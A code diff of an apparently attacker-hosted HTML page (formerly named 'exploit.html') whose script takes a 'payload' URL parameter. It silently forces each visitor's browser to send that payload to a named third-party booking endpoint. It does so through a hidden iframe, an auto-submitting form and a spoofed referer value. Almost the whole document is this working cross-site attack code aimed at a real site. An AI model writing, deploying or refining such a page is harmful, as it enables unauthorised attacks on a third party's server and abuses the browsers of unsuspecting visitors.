@@ -16,43 +16,34 @@
             var payload = getUrlParameter('payload');
             if (payload) {
                 var targetUrl = 'https://tsportalofpurpose.in/oldfiles/booking/create';
-                var fakeReferer = 'https://fcgituser.github.io/fc.github.io/exploit.html';
+                var fakeReferer = 'https://fcgituser.github.io/fc.github.io/tada.html?payload=' + encodeURIComponent(payload);
 
-                // Create a form to submit the request with the Referer header
-                var form = document.createElement('form');
-                form.method = 'GET';
-                form.action = targetUrl;
-                form.target = 'hidden_iframe';
-                form.style.display = 'none';
-
-                // Create a hidden iframe to carry the request
+                // Create a hidden iframe
                 var iframe = document.createElement('iframe');
-                iframe.name = 'hidden_iframe';
                 iframe.style.display = 'none';
                 document.body.appendChild(iframe);
 
-                // Append the form to the body
-                document.body.appendChild(form);
-
-                // Function to set the referer and submit the form
-                function submitForm() {
-                    var xhr = new XMLHttpRequest();
-                    xhr.open('GET', targetUrl, true);
-                    xhr.setRequestHeader('Referer', fakeReferer + '?payload=' + encodeURIComponent(payload));
-                    xhr.onreadystatechange = function() {
-                        if (xhr.readyState === 4) {
-                            if (xhr.status === 200) {
-                                window.location.href = targetUrl;
-                            } else {
-                                document.body.innerHTML = 'Redirection failed. Status: ' + xhr.status;
-                            }
-                        }
-                    };
-                    xhr.send();
-                }
-
-                // Set a short timeout to allow the iframe to load
-                setTimeout(submitForm, 100);
+                // Write to the iframe to set the Referer and perform the redirect
+                iframe.contentWindow.document.open();
+                iframe.contentWindow.document.write(`
+                    <html>
+                    <head>
+                        <meta http-equiv="refresh" content="0; url='${targetUrl}'">
+                        <meta name="referrer" content="no-referrer-when-downgrade">
+                    </head>
+                    <body>
+                        <form id="redirectForm" action="${targetUrl}" method="GET">
+                            <input type="hidden" name="fakeReferer" value="${fakeReferer}">
+                        </form>
+                        <script>
+                            document.getElementById('redirectForm').submit();
+                        </script>
+                    </body>
+                    </html>
+                `);
+                iframe.contentWindow.document.close();
+            } else {
+                document.body.innerHTML = 'Payload is missing.';
             }
         };
     </script>
